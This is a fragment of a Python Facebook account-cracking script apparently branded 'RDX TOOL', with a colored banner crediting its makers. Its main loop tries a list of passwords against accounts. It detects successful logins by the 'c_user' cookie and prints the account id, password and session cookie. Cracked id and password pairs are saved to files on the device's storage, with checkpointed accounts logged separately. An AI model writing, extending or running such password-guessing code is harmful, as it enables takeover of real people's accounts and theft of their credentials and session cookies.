...
def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] SEND ME REQUEST')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100064292300639')
        FD()
        return None
...
today = date.today()
logo =                                          ("""   
\033[1;32m      d8888b. d8888b. db    db 
\033[1;35m      88  `8D 88  `8D `8b  d8' 
\033[1;35m      88oobY' 88   88  `8bd8'  
\033[1;32m      88`8b   88   88  .dPYb.  
\033[1;32m      88 `88. 88  .8D .8P  Y8. 
\033[1;35m      88   YD Y8888D' YP    YP 
 
\033[1;37m================= \33[32;45mKASHIF\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBILAL\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m TRICKER MR BILAL
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-RDX
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mRDX
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mBILAL\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO RDX TOOL\33[0;m
 
\033[1;37m================== \33[32;45mRDX\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(RDX-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RDX-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(RDX-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RDX-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[RDX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
